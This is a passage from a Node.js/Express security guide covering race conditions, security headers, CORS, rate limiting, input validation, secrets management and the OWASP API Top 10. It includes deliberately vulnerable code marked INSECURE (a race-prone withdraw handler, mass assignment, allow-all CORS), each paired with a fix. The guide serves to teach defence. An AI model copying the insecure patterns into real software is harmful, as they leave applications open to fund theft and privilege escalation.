  const user = await db.users.findById(req.userId);
  
  if (user.balance < amount) {
    return res.status(400).json({ error: 'Insufficient funds' });
  }
  
  // Race window: Another request can withdraw between check and update!
  await db.users.update(req.userId, {
    balance: user.balance - amount
  });
  
  res.json({ newBalance: user.balance - amount });
});
```

**Attack:** Send two withdraw requests simultaneously. Both pass the balance check, both deduct, resulting in negative balance or double withdrawal.

```javascript
// SECURE: Atomic database operations
app.post('/api/withdraw', authenticate, async (req, res) => {
  const { amount } = req.body;
  
  // Use atomic UPDATE with WHERE clause
  const result = await db.query(
    `UPDATE users 
     SET balance = balance - $1 
     WHERE id = $2 AND balance >= $1`,
    [amount, req.userId]
  );
  
  if (result.rowCount === 0) {
    return res.status(400).json({ error: 'Insufficient funds' });
  }
  
  res.json({ success: true });
});

// SECURE: Pessimistic locking for complex operations
app.post('/api/transfer', authenticate, async (req, res) => {
  const { toAccount, amount } = req.body;
  
  await db.transaction(async (trx) => {
    // Lock both accounts
    const [from, to] = await Promise.all([
      trx.query('SELECT * FROM accounts WHERE id = $1 FOR UPDATE', [req.userId]),
      trx.query('SELECT * FROM accounts WHERE id = $1 FOR UPDATE', [toAccount])
    ]);
    
    if (from.rows[0].balance < amount) {
      throw new Error('Insufficient funds');
    }
    
    await trx.query('UPDATE accounts SET balance = balance - $1 WHERE id = $2', [amount, req.userId]);
    await trx.query('UPDATE accounts SET balance = balance + $1 WHERE id = $2', [amount, toAccount]);
    
    await trx.query(
      'INSERT INTO transactions (from_id, to_id, amount, created_at) VALUES ($1, $2, $3, NOW())',
      [req.userId, toAccount, amount]
    );
  });
  
  res.json({ success: true });
});

// SECURE: Optimistic locking with version numbers
app.put('/api/documents/:id', authenticate, async (req, res) => {
  const { id } = req.params;
  const { content, version } = req.body;  // Client sends last known version
  
  const result = await db.query(
    `UPDATE documents 
     SET content = $1, version = version + 1, updated_at = NOW()
     WHERE id = $2 AND version = $3 AND owner_id = $4`,
    [content, id, version, req.userId]
  );
  
  if (result.rowCount === 0) {
    // Either document doesn't exist, user doesn't own it, or version conflict
    return res.status(409).json({ 
      error: 'Conflict detected. Please refresh and retry.' 
    });
  }
  
  res.json({ success: true });
});
```

---

## 4. Security Headers and Middleware

### Helmet Configuration

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],  // Remove unsafe-inline if possible
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      sandbox: ['allow-forms', 'allow-scripts', 'allow-same-origin'],
      reportUri: '/api/csp-report',
      upgradeInsecureRequests: []
    }
  },
  crossOriginEmbedderPolicy: true,      // Requires CORP for embedded resources
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
  dnsPrefetchControl: { allow: false },
  expectCt: {
    maxAge: 86400,
    enforce: true
  },
  frameguard: { action: 'deny' },       // X-Frame-Options
  hidePoweredBy: true,                  // Remove X-Powered-By
  hsts: {
    maxAge: 31536000,                   // 1 year
    includeSubDomains: true,
    preload: true
  },
  ieNoOpen: true,                       // X-Download-Options
  noSniff: true,                        // X-Content-Type-Options
  originAgentCluster: true,
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true                       // Legacy X-XSS-Protection
}));
```

### CORS Configuration

```javascript
const cors = require('cors');

// INSECURE: Allow all origins
app.use(cors());

// SECURE: Whitelist with credentials
const allowedOrigins = [
  'https://app.myapp.com',
  'https://admin.myapp.com',
  /^https:\/\/.*\.myapp\.com$/
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl, server-to-server)
    if (!origin) return callback(null, true);
    
    const isAllowed = allowedOrigins.some(allowed => 
      typeof allowed === 'string' ? allowed === origin : allowed.test(origin)
    );
    
    if (isAllowed) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,           // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Request-Id'],
  maxAge: 86400,               // Preflight cache for 24 hours
  preflightContinue: false
}));
```

### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// General API rate limiting
const generalLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:general:'
  }),
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                  // 100 requests per window
  standardHeaders: true,     // Return RateLimit-* headers
  legacyHeaders: false,      // Disable X-RateLimit-* headers
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000)
    });
  },
  skip: (req) => req.path === '/health'  // Don't rate-limit health checks
});

// Strict limiter for authentication endpoints
const authLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:auth:'
  }),
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 5,                    // 5 attempts per hour
  skipSuccessfulRequests: true,  // Only count failed attempts
  keyGenerator: (req) => req.ip + ':' + req.body.email  // Per-email + IP
});

// Application-level rate limiting (per API key or user)
const userLimiter = rateLimit({
  store: new RedisStore({ client: redisClient, prefix: 'rl:user:' }),
  windowMs: 60 * 1000,
  max: (req) => req.user?.tier === 'premium' ? 1000 : 100,
  keyGenerator: (req) => req.userId || req.apiKeyId || req.ip
});

app.use('/api/', generalLimiter);
app.use('/api/auth/', authLimiter);
app.use('/api/pro/', userLimiter);
```

---

## 5. Input Validation and Sanitization

### Comparison: Zod vs Joi vs class-validator

| Feature | Zod | Joi | class-validator |
|---------|-----|-----|-----------------|
| Type Safety | Native TypeScript | @types/joi | Decorators + reflect-metadata |
| Bundle Size | ~12KB | ~100KB | ~40KB + decorators |
| Performance | Fast | Fast | Slower (reflection) |
| Express Integration | Manual or zod-express | celebrate/express-validation | Manual or routing-controllers |
| Error Messages | Customizable | Highly customizable | Basic |
| Schema Composition | Excellent | Good | Moderate |
| Community Trend | Growing rapidly | Stable/mature | Stable |

**Recommendation:** Use **Zod** for new TypeScript projects due to native type inference and excellent DX.

### Zod Implementation

```javascript
const { z } = require('zod');

// Schema definitions
const schemas = {
  login: z.object({
    email: z.string().email('Invalid email format').toLowerCase().trim(),
    password: z.string().min(8, 'Password must be at least 8 characters')
  }),
  
  createPost: z.object({
    title: z.string().min(1).max(200).trim(),
    content: z.string().min(1).max(50000),
    tags: z.array(z.string().min(1).max(50)).max(10).optional(),
    published: z.boolean().default(false)
  }),
  
  pagination: z.object({
    page: z.coerce.number().int().min(1).default(1),
    limit: z.coerce.number().int().min(1).max(100).default(20),
    sortBy: z.enum(['createdAt', 'title', 'views']).default('createdAt'),
    sortOrder: z.enum(['asc', 'desc']).default('desc')
  })
};

// Validation middleware factory
const validate = (schema) => {
  return async (req, res, next) => {
    try {
      // Validate based on where data comes from
      if (schema.body) {
        req.body = await schema.body.parseAsync(req.body);
      }
      if (schema.query) {
        req.query = await schema.query.parseAsync(req.query);
      }
      if (schema.params) {
        req.params = await schema.params.parseAsync(req.params);
      }
      next();
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          error: 'Validation failed',
          details: err.errors.map(e => ({
            path: e.path.join('.'),
            message: e.message
          }))
        });
      }
      next(err);
    }
  };
};

// Usage
app.post('/api/posts',
  authenticate,
  validate({ body: schemas.createPost, query: schemas.pagination }),
  createPostHandler
);
```

### Sanitization

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Sanitize HTML content
const sanitizeHtml = (dirty) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
  });
};

// Schema with sanitization
const commentSchema = z.object({
  text: z.string()
    .transform(val => DOMPurify.sanitize(val, { ALLOWED_TAGS: [] }))  // Strip all HTML
    .pipe(z.string().min(1).max(1000))
});
```

---

## 6. Secrets Management

### Why .env is NOT Enough

1. **Plaintext on disk** - Anyone with server access can read `.env`
2. **Version control risk** - Accidental commits expose secrets permanently
3. **No rotation** - Manual process, often forgotten
4. **No audit trail** - Who accessed what, when?
5. **No dynamic updates** - Requires restart to change values
6. **No access control** - All processes see all secrets

### Security Requirements for Secrets Management

1. **Encryption at rest** - Secrets encrypted with a master key
2. **Encryption in transit** - TLS for all secret retrieval
3. **Access control** - Role-based access to secrets
4. **Audit logging** - Every read logged
5. **Dynamic secrets** - Short-lived, automatically rotated
6. **Secret versioning** - Rollback capability
7. **Leasing** - Time-bound access with automatic revocation

### Solutions

#### HashiCorp Vault

```javascript
const vault = require('node-vault')({
  apiVersion: 'v1',
  endpoint: 'https://vault.mycompany.com:8200',
  token: process.env.VAULT_TOKEN  // This ONE secret can bootstrap everything
});

// Dynamic database credentials
const getDbCredentials = async () => {
  const { data } = await vault.read('database/creds/myapp-role');
  // Returns { username: 'v-token-myapp-xxx', password: 'xxx', lease_duration: 3600 }
  
  // Set up automatic renewal
  const leaseId = data.lease_id;
  setTimeout(() => vault.renew({ lease_id: leaseId }), data.lease_duration * 1000 * 0.75);
  
  return { username: data.username, password: data.password };
};
```

#### AWS Secrets Manager

```javascript
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const client = new SecretsManagerClient({ region: 'us-east-1' });

// Use IAM roles instead of hardcoded credentials
const getSecret = async (secretName) => {
  const command = new GetSecretValueCommand({ SecretId: secretName });
  const response = await client.send(command);
  return JSON.parse(response.SecretString);
};
```

#### Kubernetes Secrets + External Secrets Operator

```yaml
# external-secret.yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: myapp-secrets
spec:
  refreshInterval: 1h
  secretStoreRef:
    kind: ClusterSecretStore
    name: vault-backend
  target:
    name: myapp-secrets
    creationPolicy: Owner
  data:
    - secretKey: DATABASE_URL
      remoteRef:
        key: secret/data/myapp
        property: database_url
```

#### Express Integration Pattern

```javascript
// config/secure-config.js
class SecureConfig {
  constructor() {
    this.cache = new Map();
    this.ttl = 5 * 60 * 1000;  // 5 minute cache
  }
  
  async get(key) {
    const cached = this.cache.get(key);
    if (cached && cached.expiresAt > Date.now()) {
      return cached.value;
    }
    
    const value = await this.fetchFromVault(key);
    this.cache.set(key, { value, expiresAt: Date.now() + this.ttl });
    return value;
  }
  
  async fetchFromVault(key) {
    // Implementation depends on vault provider
  }
}

module.exports = new SecureConfig();
```

---

## 7. OWASP Top 10 for APIs (2023)

### API1:2023 - Broken Object Level Authorization

**Applies to Express:** Critical

Every endpoint that receives an object ID should verify the user has access to that object. Express route parameters make this easy to forget.

**Mitigation:**
- Centralize authorization checks
- Use ORM query filters that include ownership
- Never rely on client-side filtering

### API2:2023 - Broken Authentication

**Applies to Express:** Critical

Weak JWT secrets, missing token validation, brute-forceable login endpoints.

**Mitigation:**
- Use established libraries (passport.js, auth0)
- Implement MFA
- Rate-limit auth endpoints
- Use short-lived tokens with rotation

### API3:2023 - Broken Object Property Level Authorization

**Applies to Express:** High

Mass assignment vulnerabilities where users can set restricted fields.

```javascript
// INSECURE: Mass assignment
app.put('/api/users/:id', async (req, res) => {
  await db.users.update(req.params.id, req.body);  // User can set role: 'admin'!
});

// SECURE: Explicit allow-list
const ALLOWED_USER_FIELDS = ['displayName', 'bio', 'avatarUrl'];

app.put('/api/users/:id', authenticate, async (req, res) => {
  const updates = {};
  for (const field of ALLOWED_USER_FIELDS) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }
  
  await db.users.update(req.params.id, updates);
});
```

### API4:2023 - Unrestricted Resource Consumption

**Applies to Express:** High

No rate limiting, unbounded pagination, expensive queries.

**Mitigation:**
- Rate limiting (see Section 4)
- Pagination with max limits
- Query timeouts
- Request size limits (`express.json({ limit: '10kb' })`)
- Query complexity analysis for GraphQL

### API5:2023 - Broken Function Level Authorization

**Applies to Express:** Critical

Admin endpoints not properly protected, PUT accessible to regular users.

**Mitigation:**
- Default deny for all endpoints
- Explicit permission checks
- Automated testing of authorization matrix

### API6:2023 - Unrestricted Access to Sensitive Business Flows

**Applies to Express:** Medium

Automated abuse of legitimate endpoints (scraping, bulk creation).

**Mitigation:**
- CAPTCHA for high-volume actions
- Device fingerprinting
- Behavioral analysis
- Progressive rate limiting

### API7:2023 - Server Side Request Forgery

**Applies to Express:** High

See Section 3.2 SSRF above.

### API8:2023 - Security Misconfiguration

**Applies to Express:** High

Default credentials, verbose error messages, unnecessary features enabled.

**Mitigation:**
- Use helmet (Section 4)
- Disable `x-powered-by`
- Custom error handler that doesn't leak stack traces
- Regular security scanning

```javascript
// Secure error handler
app.use((err, req, res, next) => {
  const requestId = req.id;
  
  // Log full error server-side
  logger.error({ err, requestId, path: req.path });
  
  // Return generic message to client
  const statusCode = err.statusCode || 500;
  const message = process.env.NODE_ENV === 'production' 
    ? 'Internal server error' 
    : err.message;
    
  res.status(statusCode).json({
    error: message,
    requestId  // For support correlation only
  });
});
```

### API9:2023 - Improper Inventory Management

**Applies to Express:** Medium

Exposed debug endpoints, old API versions, shadow APIs.

**Mitigation:**
- API versioning strategy (`/v1/`, `/v2/`)
- Automated API discovery/documentation
- Sunset old versions with deprecation headers
- Remove debug endpoints before production

```javascript
// Deprecation header
app.use('/api/v1/', (req, res, next) => {
  res.set('Deprecation', 'true');
  res.set('Sunset', new Date('2026-12-31').toUTCString());
  res.set('Link', '</api/v2/users>; rel="successor-version"');
  next();
});
```

### API10:2023 - Unsafe Consumption of APIs

**Applies to Express:** High

Trusting data from third-party APIs without validation.

**Mitigation:**
- Validate ALL external data with Zod/Joi
- Set timeouts on all outbound requests
- Don't blindly follow redirects
- Certificate pinning for critical integrations

```javascript
const axios = require('axios');

const safeApiCall = async (url, responseSchema) => {
  const response = await axios.get(url, {
    timeout: 5000,
    maxRedirects: 2,
    validateStatus: (status) => status === 200
  });
  
  // Validate external response before using
  return responseSchema.parse(response.data);
};
```

---

## Security Checklist for Express Applications

### Authentication & Authorization
- [ ] Use argon2id or bcrypt for password hashing (never MD5/SHA1)
- [ ] Implement refresh token rotation with reuse detection
- [ ] Use OAuth 2.1 with PKCE for third-party auth
- [ ] Validate JWT `alg` header explicitly
- [ ] Implement proper session management (regenerate on login)
- [ ] Enforce authorization at the data layer (prevent IDOR)
- [ ] Use RBAC/ABAC with centralized policy engine

### Input Validation
- [ ] Validate ALL inputs with Zod/Joi (path, query, body, headers)
- [ ] Use parameterized queries (never string concatenation)
- [ ] Sanitize HTML with DOMPurify if rich content allowed
- [ ] Set request body size limits
- [ ] Validate file uploads (type, size, content scanning)

### Security Headers & Middleware
- [ ] Configure Helmet with strict CSP
- [ ] CORS with whitelist (never `*` with credentials)
- [ ] Rate limiting with Redis (general + auth + per-user)
- [ ] HTTPS only (HSTS with preload)
- [ ] SameSite=Strict cookies

### Vulnerability Prevention
- [ ] CSRF protection (SameSite cookies + state validation)
- [ ] SSRF prevention (URL validation, IP blocklist)
- [ ] XSS prevention (auto-escaping templates, CSP)
- [ ] Race condition protection (atomic DB ops, locking)
- [ ] Dependency scanning (`npm audit`, Snyk, Dependabot)

### Secrets & Infrastructure
- [ ] Use Vault/AWS Secrets Manager (not .env in production)
- [ ] Dynamic database credentials with automatic rotation
- [ ] Network segmentation (DB not exposed to internet)
- [ ] Container security (non-root user, read-only filesystem)
- [ ] Structured logging with PII redaction

---

## References

1. [OWASP Top 10 for APIs (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
2. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
3. [OAuth 2.1 Draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-10)
4. [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
5. [Google Zanzibar Paper](https://research.google/pubs/pub48190/)
6. [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
7. [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
8. [Helmet.js Documentation](https://helmetjs.github.io/)
9. [CSP Quick Reference](https://content-security-policy.com/)
10. [Auth0 Node.js Security Guide](https://auth0.com/blog/node-js-security-checklist/)

---

*This research document provides actionable security guidance for Node.js/Express applications. Security is a continuous process, not a one-time configuration. Regular audits, penetration testing, and dependency updates are essential.*
